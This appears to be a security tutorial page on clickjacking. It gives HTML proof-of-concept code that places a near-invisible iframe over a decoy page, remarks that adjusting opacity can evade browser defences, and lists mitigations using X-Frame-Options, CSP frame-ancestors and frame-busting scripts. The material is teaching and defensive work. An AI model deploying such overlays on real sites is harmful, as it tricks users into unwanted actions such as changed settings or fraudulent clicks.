# Clickjacking

### Clickjacking

{% code overflow="wrap" %}
```html
<script>alert("1337")</script>
<iframe style="opacity: 0;" width="100%" src="<http://localhost/labs/cors/info.php>"></iframe>
<p id="string" style="margin-top: -30px;">Click on me and fo this,first Ctrl+a,second Ctrl+Cm finaly Ctrl+V on textarea</p>
<textarea oninput="alert('I Hacked You '+this.value)" id="data" style="width: 300px;height: 250px;"></textarea>
```
{% endcode %}

#### **Real-World Examples**

**Social Media Clickjacking**: An attacker might trick a user into "liking" or sharing a post on social media by hiding the actual "Like" button under a seemingly unrelated button.

**Ad Fraud**: Users may be tricked into clicking on ads without realizing it, generating revenue for the attacker.

**Critical Actions**: Clickjacking can be used to change security settings, subscribe to services, or initiate file downloads without the user's consent.

#### **Constructing a Basic Clickjacking Attack**

Clickjacking is an attack where the attacker tricks a user into clicking on something different from what they perceive by overlaying a transparent iframe of the target website over a decoy webpage. Here’s how you can construct a basic clickjacking attack using HTML and CSS:

**Example Code:**

```html
<html>
<head>
    <style>
        /* Styling for the target website iframe */
        #target_website {
            position: relative; /* Allows positioning relative to its normal position */
            width: 128px; /* Set the width to match the clickable area */
            height: 128px; /* Set the height to match the clickable area */
            opacity: 0.00001; /* Make the iframe nearly invisible */
            z-index: 2; /* Ensure the iframe is on top of the decoy content */
        }

        /* Styling for the decoy website */
        #decoy_website {
            position: absolute; /* Position it absolutely in the browser window */
            width: 300px; /* Set the decoy width */
            height: 400px; /* Set the decoy height */
            z-index: 1; /* Place the decoy content behind the iframe */
        }
    </style>
</head>
<body>
    <div id="decoy_website">
        <!-- Decoy web content here, e.g., "Click to win!" button -->
    </div>
    <iframe id="target_website" src="<https://vulnerable-website.com>">
    </iframe>
</body>
```

**Key Concepts:**

* **Positioning**: The <mark style="color:red;">**`position`**</mark> properties (<mark style="color:red;">**`relative`**</mark> for the iframe, `absolute` for the decoy) ensure that the iframe overlaps the decoy content correctly. Adjusting the `top`, **`left`**, `width`, and `height` values precisely position the iframe over the decoy content.
* **Layering (z-index)**: The **`z-index`** property controls the stack order of elements. The iframe (**`z-index`**`:`` `**`2`**) is layered above the decoy content (**`z-index: 1`**) so that any clicks will interact with the iframe.
* **Opacity**: The **`opacity`** value is set close to **`0.0`**, making the iframe nearly invisible to the user. Careful adjustment of the opacity can evade browser defences that detect fully transparent iframes, such as in Chrome.

### **Tools**

<mark style="color:purple;">**Burp Clickbandit**</mark>

### Mitigation

#### 1. **Use the `X-Frame-Options` Header**

1.**`X-Frame-Options`: DENY**

2.**`X-Frame-Options`: SAMEORIGIN**

Note **Allow specific origin framing** (if necessary):

<mark style="color:blue;">**`X-Frame-Options`**</mark>**: ALLOW\_FROM** [**https://trustdomain.com**](https://trustdomain.com)

#### 2. **Use Content Security Policy (CSP)**

allow frame only same origin

Content-Security-Policy: frame-ancestors 'self';

allow from only trust domain

Content-Security-Policy: frame-ancestors 'self'[https://trusteddomain.com](https://trusteddomain.com);

completely block framing

Content-Security-Policy: frame-ancestors 'none';

#### **3. Frame Busting Scripts** (Deprecated Approach)

```jsx
if (top !== self) {
    top.location = self.location;
}
```
